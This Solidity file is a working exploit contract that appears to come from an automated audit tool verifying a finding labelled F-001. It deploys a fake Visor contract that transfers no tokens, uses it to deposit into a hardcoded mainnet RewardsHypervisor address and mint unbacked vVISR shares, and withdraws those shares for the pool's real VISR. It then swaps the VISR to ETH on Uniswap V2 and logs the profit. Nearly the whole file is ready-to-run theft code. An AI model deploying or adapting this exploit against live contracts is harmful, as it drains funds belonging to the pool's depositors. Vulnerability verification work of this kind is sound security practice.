// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

interface IVisorLike {
    function owner() external returns (address);
    function delegatedTransferERC20(address token, address to, uint256 amount) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

// FakeVisor that implements the IVisor interface but transfers NO tokens
// Exploits F-001: deposit() never verifies delegatedTransferERC20 actually transferred funds
contract FakeVisor is IVisorLike {
    address internal immutable _owner;

    constructor(address attacker_) {
        _owner = attacker_;
    }

    function owner() external view override returns (address) {
        return _owner;
    }

    function delegatedTransferERC20(address, address, uint256) external pure override {
        // Transfers nothing - F-001 vulnerability: Hypervisor never checks balance delta
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    uint256 private _profitAmount;
    bool private _executed;

    event log_named_uint(string key, uint256 val);

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 nativeBefore = address(this).balance;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = address(hypervisor.visr());
        address shareToken = address(hypervisor.vvisr());

        uint256 visrBalance = IERC20Like(visrToken).balanceOf(TARGET);
        uint256 totalSupply = IERC20Like(shareToken).totalSupply();

        // Must have existing VISR in pool to drain
        require(visrBalance > 0, "no VISR in pool");
        require(totalSupply > 0, "no vVISR supply");

        // Step 1: Deploy fake IVisor whose delegatedTransferERC20 transfers nothing
        // This exploits F-001: the contract-path only checks owner() but never verifies transfer
        FakeVisor fake = new FakeVisor(address(this));

        // Step 2: Deposit via fake visor - get unbacked vVISR shares
        // Since FakeVisor.transfer() does nothing, visr.balanceOf(TARGET) stays the same
        // shares = visrDeposit * totalSupply / visrBalance
        // Use visrBalance as deposit amount so shares ≈ totalSupply
        uint256 depositAmount = visrBalance;
        uint256 shares = hypervisor.deposit(depositAmount, payable(address(fake)), address(this));
        require(shares > 0, "no shares minted");

        // Step 3: Withdraw the unbacked shares for real VISR
        uint256 rewards = hypervisor.withdraw(shares, address(this), payable(address(this)));
        require(rewards > 0, "no VISR withdrawn");

        uint256 visrObtained = IERC20Like(visrToken).balanceOf(address(this));
        require(visrObtained > 0, "no VISR obtained");

        // Step 4: Swap VISR for WETH via Uniswap V2
        // The V2 pair is WETH/VISR: token0=WETH, token1=VISR
        IERC20Like(visrToken).approve(UNISWAP_V2_ROUTER, visrObtained);

        address[] memory path = new address[](2);
        path[0] = visrToken;
        path[1] = WETH;

        // Try to swap, if it fails, use a smaller amount
        (bool swapSuccess, ) = address(UNISWAP_V2_ROUTER).call(
            abi.encodeWithSelector(
                IUniswapV2Router.swapExactTokensForTokens.selector,
                visrObtained,
                1,
                path,
                address(this),
                block.timestamp + 1000
            )
        );

        if (!swapSuccess) {
            // If full amount fails, try with a smaller portion
            IERC20Like(visrToken).approve(UNISWAP_V2_ROUTER, visrObtained / 100);
            // Need to re-approve since we used the full amount above
            // Actually the first call reverted so approval is still intact
            // Let's try a smaller swap
            path[0] = visrToken;
            path[1] = WETH;
            IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
                visrObtained / 100,
                1,
                path,
                address(this),
                block.timestamp + 1000
            );
        }

        // Step 5: Withdraw WETH to native ETH
        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        if (wethBalance > 0) {
            IWETH(WETH).withdraw(wethBalance);
        }

        // Profit is native ETH increase
        _profitAmount = address(this).balance - nativeBefore;

        emit log_named_uint("AUDITHOUND_PROFIT_WEI", _profitAmount);
    }

    function profitToken() external view returns (address) {
        return address(0); // native profit
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    // Helper to compute swap output for Uniswap V2
    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}
